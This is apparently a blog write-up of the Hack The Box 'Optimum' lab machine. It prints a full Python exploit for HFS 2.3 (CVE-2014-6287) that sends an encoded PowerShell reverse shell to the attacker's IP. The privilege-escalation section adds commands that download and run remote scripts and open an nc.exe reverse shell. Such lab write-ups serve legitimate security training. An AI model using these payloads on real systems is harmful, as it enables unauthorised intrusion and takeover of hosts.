---
title: "Optimum"
date: 2023-07-20T23:36:20+02:00
tags: ["windows","web","privesc"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Desc Text."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Optimum
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Optimum

![Untitled](/HTB/optimum-icon.png)

## Tools Used

- Nmap
- Searchsploit
- winPEAS
- Sherlock

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-title: HFS /
|_http-server-header: HFS 2.3
| http-methods:
|_  Supported Methods: GET HEAD POST
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

With a quick port scan we can observe that the only thing which seems open is webpage running at **port 80.**

## Enumeration

![Untitled](/HTB/optimum-1.png)

If we take a quick look to the page we can see that is a http file transfer server.

The home page leaks the version of HFS that is using in this case is the **HFS 2.3**.

![Untitled](/HTB/optimum-2.png)

Let’s see if we can find any exploit in **searchsploit.**

![Untitled](/HTB/optimum-3.png)

## Exploiting

There are a lot of exploits talking about Remote Command Injection this can help us to put a reverse shell on the remote machine. I have chosen `HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)`.

```python
# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 20/02/2021
# Exploit Author: Pergyz
# Vendor Homepage: http://www.rejetto.com/hfs/
# Software Link: https://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Microsoft Windows Server 2012 R2 Standard
# CVE : CVE-2014-6287
# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands

#!/usr/bin/python3

import base64
import os
import urllib.request
import urllib.parse

lhost = "10.10.14.20"
lport = 4444
rhost = "10.10.10.8"
rport = 80

# Define the command to be written to a file
command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'

# Encode the command in base64 format
encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
print("\nEncoded the command in base64 format...")

# Define the payload to be included in the URL
payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

# Encode the payload and send a HTTP GET request
encoded_payload = urllib.parse.quote_plus(payload)
url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
urllib.request.urlopen(url)
print("\nEncoded the payload and sent a HTTP GET request to the target...")

# Print some information
print("\nPrinting some information for debugging...")
print("lhost: ", lhost)
print("lport: ", lport)
print("rhost: ", rhost)
print("rport: ", rport)
print("payload: ", payload)

# Listen for connections
print("\nListening for connection...")
os.system(f'nc -lv {lport}')
```

This code is a pretty simple python implementation which allow us to put a reverse shell in the remote machine sending a command in the search section of the url `http://10.10.10.8/?search=%00{{.{encoded_payload}.}}`.

Bellow you can see the powershell command which we are using.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()
```

The command is encoded helping us to keep the victim machine from noticing.

In this exploit only we need to change the lhost, lport and rhost, rport and run it.

![Untitled](/HTB/optimum-4.png)

## Gaining an Initial Foothold

Once executed we have successfully engaged the user.

Let’s cat the **user’s flag**.

![Untitled](/HTB/optimum-5.png)

## Escalating Privilege

Now let’s see more information about the system with winPEAS. We can send it via a smb server.

```powershell
smbserver.py smbFolder $(pwd) -smb2support
```

Only lefts copy it with:

```powershell
copy \\10.10.14.20\smbFolder\winPEASx64.exe .
```

Once executed we have the next valuable information.

```powershell
		Hostname: optimum                               
    ProductName: Windows Server 2012 R2 Standard
    EditionID: ServerStandard                       
    ReleaseId:                                      
    BuildBranch:                                    
    CurrentMajorVersionNumber:                      
    CurrentVersion: 6.3                             
    Architecture: AMD64
```

Now let’s take a look if this system has some common windows vulns to privesc. Normally I start with Watson but the minimum .NET version required by Watson in winPEAS is 4.5, and this host only has up to 4.0, so I am going to start with Sherlock.

First let's open a web server to load the script.

```python
python3 -m http.server 80
```

Now let’s load the script with powershell.

```powershell
IEX(New-Object Net.Webclient).downloadString('http://10.10.14.20/Sherlock.ps1')
```

We can start the scan with `Find-AllVulns`

```powershell
Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable
```

The only three vulns that Appears Vulnerable are the **MS16-032**, **MS16-034** and **MS16-135**.

I tried to run the three vulns many different ways but no one seems to work, then I realized of the importance of the architecture. 

If we put the next command:

![Untitled](/HTB/optimum-6.png)

We observe that the system is 64 bits but the powershell that we have is 32 bits one. Our scripts can’t be loaded.

There is a way to change the shell to a 64 bits one by putting the absolut path of the shell we are going to use in the command injection script. We can follow the next table to know where is the powershell path depending on the architecture we start from.

![Untitled](/HTB/optimum-7.webp)

Changing the path in the script, the payload line looks like this:

```powershell
# Define the payload to be included in the URL
payload = f'exec|\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'
```

Let’s run it again and check if this works well.

![Untitled](/HTB/optimum-8.png)

### MS16-032

If we follow the [link](https://www.exploit-db.com/exploits/39719) of the sherlock scan we can see that is an exploit db powershell script, so let’s download it with **searchsploit.** 

If we put again the http server, try to load it and run it, the script doesn’t seems to do nothing.

![Untitled](/HTB/optimum-9.png)

It’s possible that the scripts is popping a new window shell with root privilege, but in our scenario it doesn’t help us. I found a variation of this script [here](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1) which allow us to introduce a command to the root shell, so I created a powershell file called **revShell.ps1** with only the reverse shell command and started a http server in the file directory.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.20",4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()
```

And with a nc listener, I run the Invoke-MS16032.ps1 script with the next command.

```bash
sudo nc -lv 4444
```

```powershell
Invoke-MS16032 -Command "IEX(New-Object Net.Webclient).downloadString('http://10.10.14.20/revShell.ps1')"
```

I tried to run the previous command in many different ways but doesn’t worked, so I changed a little bit the script to put a nc reverse shell instead.

```powershell
C:\Windows\Temp\PrivEsc\nc.exe -e cmd 10.10.14.20 4444
```

In this way, only we will need to copy a nc binary into the `\Windows\Temp\PrivEsc` folder, so I started a [smbserver.py](http://smbserver.py) to copy it (The binary which I used is the [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells/FuzzDB) one).

```powershell
cd \Windows\Temp
mkdir PrivEsc
copy \\10.10.14.20\smbFolder\nc.exe .
```

Now let’s run again the command.

We are root now.

![Untitled](/HTB/optimum-10.png)

Only have to find **root’s flag.**

![Untitled](/HTB/optimum-11.png)

**Thank you for reading, and happy hacking! 😄**